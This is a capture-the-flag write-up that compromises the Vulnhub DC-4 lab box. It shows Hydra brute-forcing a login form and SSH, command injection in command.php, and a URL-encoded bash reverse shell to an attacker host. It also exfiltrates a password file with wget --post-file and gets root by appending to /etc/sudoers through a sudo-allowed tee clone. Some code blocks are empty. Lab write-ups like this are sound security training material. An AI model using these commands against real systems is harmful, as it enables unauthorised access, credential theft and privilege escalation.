### HTTP
Before running any more scanners, let's check what the site looks like.
![login](/images/vhub/dc/4_1.png)

The site is running PHP, so I tried various SQL injections but without luck. Let's find out more.

We are redirected to /index.php from /login.php, /logout.php, and /command.php. So far there's no limit to submitting login credentials and this is a PHP app, so let's brute-force with Hydra. Normally you provide a success or failure message in a Hydra command, but this form doesn't provide either. Since command.php appears to be the page we'll be directed to on a successful login (given the other options), We include "command" as part of the success message (even if it will only be in the filename). We also use "admin" as the username, which seems like a solid first guess (administrator, root, etc to follow if necessary). The form fields in the source code are `username` and `password`, so we'll formulate our command to accomodate.
```
root@kali:~/Security/Vulnhub/DC-Series/4# hydra -l admin -P /root/rockyou.txt 10.10.10.9 http-post-form '/login.php:username=^USER^&password=^PASS^:S=command'

New creds! `admin:happy`

Logging in requires double clicking submit for some reason, but I'm just glad Hydra didn't worry about it.

![system tools](/images/vhub/dc/4_2.png)

Let's checkout command.php:

![system tools](/images/vhub/dc/4_3.png)

The different radio buttons let us run `ls -l`, `du -h`, and `df -h`. These commands wouldn't happen to be passed unsanitized would they? Let's turn on our proxy and open Burp Suite to check.

```

```
Uh oh, let's insert other commands to verify this RCE. I updated the final line to: `radio=whoami&submit=Run`

![whoami](/images/vhub/dc/4_4.png)

Let's intercept another request and run some more nefarious commands.

## Gaining Access

I tried passing a few commands in to get a shell, including using a URL encoder, e.g. `bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.6%2F1234+0%3E%261`. Turns out, all I needed to do was send this:
```

Let's check our listener.
```

```
We're in--now to escalate.
## Escalating Privileges
```
$ ls /home
ls /home
charles  jim  sam
$ ls -a /home/* -r
ls -a /home/* -r
/home/sam:
.profile  .bashrc  .bash_logout  ..  .

/home/jim:
test.sh  mbox  backups	.profile  .bashrc  .bash_logout  ..  .

/home/charles:
.profile  .bashrc  .bash_logout  ..  .
```
User `jim` looks most promising.
```
$ cd jim
cd jim
$ ls -la test.sh
ls -la test.sh
-rwsrwxrwx 1 jim jim 174 Apr  6  2019 test.sh
$ cat test.sh
cat test.sh
#!/bin/bash
for i in {1..5}
do
 sleep 1
 echo "Learn bash they said."
 sleep 1
 echo "Bash is good they said."
done
 echo "But I'd rather bash my head against a brick wall."
$ ls -a backups
ls -a backups
.  ..  old-passwords.bak
$ file mbox
file mbox
mbox: regular file, no read permission
```
The script looks promising but so do the list of old passwords. Let's exfiltrate them and try to SSH into the box as `jim`.

```
# Victim
$ wget --post-file=old-passwords.bak 10.10.10.6:8081

# Attacker
root@kali:~/Security/Vulnhub/DC-Series/4# nc -nlvp 8081 > file_with_nc_stuff

root@kali:~/Security/Vulnhub/DC-Series/4# tail -n +10 file_with_nc_stuff > old-passwords.bak
```
Here we can use metasploit `scanner/ssh/ssh_login`, but I decided to use `hydra`'s SSH option.
```
root@kali:~/Security/Vulnhub/DC-Series/4# hydra -l jim -P old-passwords.bak 10.10.10.9 ssh
...
[22][ssh] host: 10.10.10.9   login: jim   password: jibril04
...
root@kali:~/Security/Vulnhub/DC-Series/4# ssh jim@10.10.10.9
...
You have mail.
Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100
jim@dc-4:~$
```
We have mail! First let's check our home directory's `mbox` file which we now have permission to read:
```

This is a test.

We can read our mail in /var/mail/jim or we can use the `mail` command:
```

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles
```
Now in fact, the message is saved to `jim`'s personal mailbox in /home/jim/mbox. And, we have new credentials: `charles:^xHhA&hvim0y`
```
jim@dc-4:~$ su charles
Password: 
charles@dc-4:~$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
charles@dc-4:~$ ls -l /usr/bin/teehee
-rwxr-xr-x 1 root root 38740 Apr  6  2019 /usr/bin/teehee
charles@dc-4:~$ file /usr/bin/teehee
/usr/bin/teehee: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cc779c5a37fe07a78ea82a246199a7ff4e5c4ad8, stripped
```
SUID bit is set. Let's see what it does:
```
charles@dc-4:~$ teehee
hi
hi
redirect?
redirect?
charles@dc-4:~$ echo a | tee b
a
charles@dc-4:~$ ls
b
charles@dc-4:~$ cat b
a
```
Seems like `tee`. Also, `tee --help` and `teehee --help` were identical besides the name. We can use `sudo teehee` to write to any file, so why not add charles to the sudoers file? /etc/sudoers specifies user privileges for root like so: `root	ALL=(ALL:ALL) ALL`. 
```
charles@dc-4:~$ echo "charles  ALL=(ALL:ALL) ALL" | sudo teehee /etc/sudoers
charles  ALL=(ALL:ALL) ALL
charles@dc-4:~$ sudo -l
[sudo] password for charles: # ^xHhA&hvim0y
User charles may run the following commands on dc-4:
    (ALL : ALL) ALL
charles@dc-4:~$ sudo su

Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.

This was a neat challenge; I hope you enjoyed my writeup.
